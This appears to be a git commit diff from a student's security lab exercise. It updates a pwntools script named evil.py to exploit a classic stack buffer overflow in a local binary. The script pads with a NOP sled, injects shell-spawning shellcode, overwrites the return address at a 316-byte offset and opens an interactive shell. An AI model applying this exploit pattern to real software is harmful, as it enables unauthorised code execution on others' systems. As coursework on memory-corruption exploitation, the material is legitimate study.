a5887e8ff9dd07f4fc0ef9edb378e77b9d160e08
Agni <agni@kali.softwarica>
2022-01-27 11:37:26 +0545

    classic overflow attempt

--- Week9/Classic_Overflows/evil.py
+++ Week9/Classic_Overflows/evil.py
@@ -1,12 +1,18 @@
 from pwn import *
 context(os='linux', arch='i386')
+context.log_level='debug'
 proc = process('./overflow')
+OFFSET = 316
 out = proc.read()
 print(out)
 pause()
+EAX_ADD = 0xffffcf80
 
-payload = b'A'*316
-payload += b'B'*4
+payload = b'\x90'*30
+payload += asm(shellcraft.sh())
+payload += b'\x90'*(OFFSET - len(payload))
+payload += p32(EAX_ADD)
+
 proc.writeline(payload)
-out = proc.read()
-print(out)
+out = proc.interactive()
+# print(out)
